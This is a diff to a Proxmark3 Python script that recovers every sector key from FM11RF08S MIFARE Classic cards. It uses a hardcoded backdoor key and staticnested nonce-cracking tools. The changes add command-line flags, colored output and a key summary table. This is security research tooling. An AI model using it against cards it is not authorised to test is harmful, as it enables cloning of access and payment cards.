@@ -15,22 +15,25 @@
 
 import time
 import subprocess
+import argparse
+# pip install ansicolors
+from colors import color
 import pm3
 from output_grabber import OutputGrabber
 
 BACKDOOR_RF08S = "A396EFA4E24F"
 NUM_SECTORS = 16
-# Run an initial check with the default keys
-INITIAL_CHECK = True
-# Run a final check with the found keys, mostly for validation
-FINAL_CHECK = True
-
 TOOLS_PATH = "tools/mfc/card_only"
 STATICNESTED_1NT = f"{TOOLS_PATH}/staticnested_1nt"
 STATICNESTED_2X1NT = f"{TOOLS_PATH}/staticnested_2x1nt_rf08s"
 STATICNESTED_2X1NT1KEY = f"{TOOLS_PATH}/staticnested_2x1nt_rf08s_1key"
-DEBUG = False
 
+parser = argparse.ArgumentParser(description='A script combining staticnested* tools '
+                                 'to recover all keys from a FM11RF08S card.')
+parser.add_argument('-x', '--no-init-check', action='store_true', help='Do not run an initial fchk for default keys')
+parser.add_argument('-y', '--no-final-check', action='store_true', help='Do not run a final fchk with the found keys')
+parser.add_argument('-d', '--debug', action='store_true', help='Enable debug mode')
+args = parser.parse_args()
 
 start_time = time.time()
 out = OutputGrabber()
@@ -55,10 +58,16 @@ if uid is None:
         with out:
             p.console("prefs set color --ansi")
     exit()
-print(f"UID: {uid:08X}")
+print("UID: " + color(f"{uid:08X}", fg="green"))
+
+
+def print_key(sec, key_type, key):
+    kt = ['A', 'B'][key_type]
+    print(f"Sector {sec:2} key{kt} = " + color(key, fg="green"))
+
 
 found_keys = [["", ""] for _ in range(NUM_SECTORS)]
-if INITIAL_CHECK:
+if not args.no_init_check:
     print("Checking default keys...")
     with out:
         p.console("hf mf fchk")
@@ -68,10 +77,10 @@ if INITIAL_CHECK:
             sec = int(res[0][4:])
             if res[3] == '1':
                 found_keys[sec][0] = res[2]
-                print(f"Sector {sec:2} keyA = {found_keys[sec][0]}")
+                print_key(sec, 0, found_keys[sec][0])
             if res[5] == '1':
                 found_keys[sec][1] = res[4]
-                print(f"Sector {sec:2} keyB = {found_keys[sec][1]}")
+                print_key(sec, 1, found_keys[sec][1])
 
 nt = [["", ""] for _ in range(NUM_SECTORS)]
 nt_enc = [["", ""] for _ in range(NUM_SECTORS)]
@@ -115,12 +124,12 @@ for sec in range(NUM_SECTORS):
         for key_type in [0, 1]:
             cmd = [STATICNESTED_1NT, f"{uid:08X}", f"{sec}",
                    nt[sec][key_type], nt_enc[sec][key_type], par_err[sec][key_type]]
-            if DEBUG:
+            if args.debug:
                 print(' '.join(cmd))
             subprocess.run(cmd, capture_output=True)
         cmd = [STATICNESTED_2X1NT,
                f"keys_{uid:08x}_{sec:02}_{nt[sec][0]}.dic", f"keys_{uid:08x}_{sec:02}_{nt[sec][1]}.dic"]
-        if DEBUG:
+        if args.debug:
             print(' '.join(cmd))
         subprocess.run(cmd, capture_output=True)
         filtered_dicts[sec][key_type] = True
@@ -140,7 +149,7 @@ for sec in range(NUM_SECTORS):
             key_type = 1
         cmd = [STATICNESTED_1NT, f"{uid:08X}", f"{sec}",
                nt[sec][key_type], nt_enc[sec][key_type], par_err[sec][key_type]]
-        if DEBUG:
+        if args.debug:
             print(' '.join(cmd))
         subprocess.run(cmd, capture_output=True)
         with (open(f"keys_{uid:08x}_{sec:02}_{nt[sec][key_type]}.dic")) as f:
@@ -188,7 +197,7 @@ for sec in range(NUM_SECTORS):
             kt = ['a', 'b'][key_type]
             dic = f"keys_{uid:08x}_{sec:02}_{nt[sec][key_type]}_duplicates.dic"
             cmd = f"hf mf fchk --blk {sec * 4} -{kt} -f {dic} --no-default"
-            if DEBUG:
+            if args.debug:
                 print(cmd)
             with out:
                 p.console(cmd)
@@ -197,12 +206,10 @@ for sec in range(NUM_SECTORS):
                     abort = True
                 if "found:" in line:
                     found_keys[sec][key_type] = line[30:]
-                    kt = ['A', 'B'][key_type]
-                    print(f"Sector {sec:2} key{kt} = {found_keys[sec][key_type]}")
+                    print_key(sec, key_type, found_keys[sec][key_type])
                     if nt[sec][0] == nt[sec][1] and found_keys[sec][key_type ^ 1] == "":
                         found_keys[sec][key_type ^ 1] = found_keys[sec][key_type]
-                        kt = ['A', 'B'][key_type ^ 1]
-                        print(f"Sector {sec:2} key{kt} = {found_keys[sec][key_type ^ 1]}")
+                        print_key(sec, key_type ^ 1, found_keys[sec][key_type ^ 1])
         if abort:
             break
     if abort:
@@ -217,7 +224,7 @@ for sec in range(NUM_SECTORS):
             kt = ['a', 'b'][key_type]
             dic = f"keys_{uid:08x}_{sec:02}_{nt[sec][key_type]}_filtered.dic"
             cmd = f"hf mf fchk --blk {sec * 4} -{kt} -f {dic} --no-default"
-            if DEBUG:
+            if args.debug:
                 print(cmd)
             with out:
                 p.console(cmd)
@@ -226,8 +233,7 @@ for sec in range(NUM_SECTORS):
                     abort = True
                 if "found:" in line:
                     found_keys[sec][key_type] = line[30:]
-                    kt = ['A', 'B'][key_type]
-                    print(f"Sector {sec:2} key{kt} = {found_keys[sec][key_type]}")
+                    print_key(sec, key_type, found_keys[sec][key_type])
         if abort:
             break
     if abort:
@@ -240,7 +246,7 @@ for sec in range(NUM_SECTORS):
         kt = ['a', 'b'][key_type]
         dic = f"keys_{uid:08x}_{sec:02}_{nt[sec][key_type]}.dic"
         cmd = f"hf mf fchk --blk {sec * 4} -{kt} -f {dic} --no-default"
-        if DEBUG:
+        if args.debug:
             print(cmd)
         with out:
             p.console(cmd)
@@ -250,8 +256,8 @@ for sec in range(NUM_SECTORS):
             if "found:" in line:
                 found_keys[sec][0] = line[30:]
                 found_keys[sec][1] = line[30:]
-                print(f"Sector {sec:2} keyA = {found_keys[sec][key_type]}")
-                print(f"Sector {sec:2} keyB = {found_keys[sec][key_type]}")
+                print_key(sec, 0, found_keys[sec][key_type])
+                print_key(sec, 1, found_keys[sec][key_type])
     if abort:
         break
 
@@ -270,7 +276,7 @@ for sec in range(NUM_SECTORS):
         else:
             dic = f"keys_{uid:08x}_{sec:02}_{nt[sec][key_type_target]}.dic"
         cmd = [STATICNESTED_2X1NT1KEY, nt[sec][key_type_source], found_keys[sec][key_type_source], dic]
-        if DEBUG:
+        if args.debug:
             print(' '.join(cmd))
         result = subprocess.run(cmd, capture_output=True, text=True).stdout
         keys = set()
@@ -283,7 +289,7 @@ for sec in range(NUM_SECTORS):
             cmd = f"hf mf fchk --blk {sec * 4} -{kt} --no-default"
             for k in keys:
                 cmd += f" -k {k}"
-            if DEBUG:
+            if args.debug:
                 print(cmd)
             with out:
                 p.console(cmd)
@@ -295,8 +301,7 @@ for sec in range(NUM_SECTORS):
         elif len(keys) == 1:
             found_keys[sec][key_type_target] = keys.pop()
         if found_keys[sec][key_type_target] != "":
-            kt = ['A', 'B'][key_type_target]
-            print(f"Sector {sec:2} key{kt} = {found_keys[sec][key_type_target]}")
+            print_key(sec, key_type_target, found_keys[sec][key_type_target])
     if abort:
         break
 if restore_color:
@@ -305,36 +310,59 @@ if restore_color:
 
 if abort:
     print("Brute-forcing phase aborted via keyboard!")
-    FINAL_CHECK = False
+    args.no_final_check = True
 
-if FINAL_CHECK:
-    print("Letting fchk do a final dump, just for confirmation and display...")
-    keys_set = set([i for sl in found_keys for i in sl if i != ""])
-    with (open(f"keys_{uid:08x}.dic", "w")) as f:
-        for k in keys_set:
-            f.write(f"{k}\n")
-    cmd = f"hf mf fchk -f keys_{uid:08x}.dic --no-default --dump"
-    if DEBUG:
-        print(cmd)
-    with out:
-        p.console(cmd)
-    for line in out.captured_output.split('\n'):
-        print(line)
-else:
-    print(found_keys)
-    print("Generating binary key file")
+if args.no_final_check:
+    plus = "[" + color("+", fg="green") + "] "
+    print()
+    print(plus + color("found keys:", fg="green"))
+    print()
+    print(plus + "-----+-----+--------------+---+--------------+----")
+    print(plus + " Sec | Blk | key A        |res| key B        |res")
+    print(plus + "-----+-----+--------------+---+--------------+----")
+    for sec in range(NUM_SECTORS):
+        keys = [["", 0], ["", 0]]
+        for key_type in [0, 1]:
+            if found_keys[sec][key_type] == "":
+                keys[key_type] = [color("------------", fg="red"), color("0", fg="red")]
+            else:
+                keys[key_type] = [color(found_keys[sec][0], fg="green"), color("1", fg="green")]
+        print(plus + f" {sec:03} | {sec*4+3:03} | {keys[0][0]} | {keys[0][1]} | {keys[1][0]} | {keys[1][1]} ")
+    print(plus + "-----+-----+--------------+---+--------------+----")
+    print(plus + "( " + color("0", fg="red") + ":Failed / " +
+          color("1", fg="green") + ":Success )")
+    print()
+    print(plus + "Generating binary key file")
     keyfile = f"hf-mf-{uid:08X}-key.bin"
+    unknown = False
     with (open(keyfile, "wb")) as f:
         for key_type in [0, 1]:
             for sec in range(NUM_SECTORS):
                 k = found_keys[sec][key_type]
                 if k == "":
                     k = "FFFFFFFFFFFF"
+                    unknown = True
                 f.write(bytes.fromhex(k))
-    print(f"Found keys have been dumped to `{keyfile}`")
-    print(" --[ FFFFFFFFFFFF ]-- has been inserted for unknown keys")
+    print(plus + "Found keys have been dumped to `" + color(keyfile, fg="yellow")+"`")
+    if unknown:
+        print("[" + color("=", fg="yellow") + "]  --[ " + color("FFFFFFFFFFFF", fg="yellow") +
+              " ]-- has been inserted for unknown keys")
+else:
+    print("Letting fchk do a final dump, just for confirmation and display...")
+    keys_set = set([i for sl in found_keys for i in sl if i != ""])
+    with (open(f"keys_{uid:08x}.dic", "w")) as f:
+        for k in keys_set:
+            f.write(f"{k}\n")
+    cmd = f"hf mf fchk -f keys_{uid:08x}.dic --no-default --dump"
+    if args.debug:
+        print(cmd)
+    with out:
+        p.console(cmd)
+    for line in out.captured_output.split('\n'):
+        print(line)
 
 elapsed_time = time.time() - start_time
 minutes = int(elapsed_time // 60)
 seconds = int(elapsed_time % 60)
-print(f"--- {minutes} minutes {seconds} seconds ---")
+print("--- " + color(minutes, fg="yellow") + " minutes " +
+      color(seconds, fg="yellow") + " seconds ---")
